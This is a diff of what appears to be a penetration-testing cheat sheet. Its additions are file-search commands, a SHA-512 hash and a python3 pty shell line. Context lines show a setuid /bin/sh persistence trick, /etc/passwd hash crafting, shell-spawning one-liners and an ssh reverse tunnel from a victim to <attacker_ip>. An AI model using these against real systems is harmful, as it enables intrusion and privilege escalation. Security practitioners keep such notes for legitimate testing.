@@ -607,6 +607,18 @@ find / -type f -newermt 2020-02-10 ! -newermt 2020-02-28 -ls 2>/dev/null
 
 grep -Er '(preg_replace|phpinfo()|system)' * | grep '.php:'
 
+
+# Bash find files between two dates:
+find . -type f -newermt 2010-10-07 ! -newermt 2014-10-08
+
+# Bash find files from 15 minutes ago until now:
+
+find . -type f -mmin -15
+
+#Bash find files between two timestamps:
+find . -type f -newermt "2014-10-08 10:17:00" ! -newermt "2014-10-08 10:53:00"
+
+
 ```
 
 ## Persistance
@@ -1059,7 +1071,7 @@ import os; os.system('cp /bin/sh /tmp/sh');   os.system('chown root.root /tmp/sh
     #1 /etc/passwd
     https://unix.stackexchange.com/questions/81240/manually-generate-password-for-etc-shadow
 
-    openssl passwd -6 -salt <xyz>  <yourpass>
+    openssl passwd -salt <xyz>  <yourpass>
         -1 : MD5 password,
         -5 : SHA256 
         -6 : SHA512 
@@ -1068,6 +1080,8 @@ import os; os.system('cp /bin/sh /tmp/sh');   os.system('chown root.root /tmp/sh
         --method=md5
         --method=sha-256
         --method=sha-512
+
+    $6$bwL9Kv2faBAyJPN$zDTWRSChi/5YL7FYSr6QherkDadkK.wWrg3GS8R7N8oagIY8ufxTalKkGzbBIQB1Nga3TVAF/wnQ/uszJoFa81
 
     #2 Wordpress
     $P$BZ9cvCg4NZMOtHvOEhxws.wSX6/OX7. : 123456
@@ -1200,6 +1214,7 @@ nmap 192.168.110.51 -p 389 --script ldap-search --script-args 'ldap.username="cn
 # Spawning a TTY Shell
 
     python -c 'import pty; pty.spawn("/bin/sh")'
+    python3 -c 'import pty; pty.spawn("/bin/sh")'
     echo os.system('/bin/bash')
     /bin/sh -i
     perl -e 'exec "/bin/sh";'
@@ -1300,6 +1315,8 @@ https://github.com/rebootuser
     # victim's machine
     # ssh-keygen -P "" -f key
     ssh -N -f -R 2222:internalTarget:22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null kali@<attacker_ip> -i key 2>&1
+    
+
     
 
 ## Meterpreter session
@@ -1523,7 +1540,7 @@ gdb-peda$ asmsearch "call esp"
 gdb-peda$ find "\xff\xd4" binary
 gdb-peda$ find "\xff\xe4" binary
 
-
+objdump -d tfc |grep ".plt" 
 
 
 
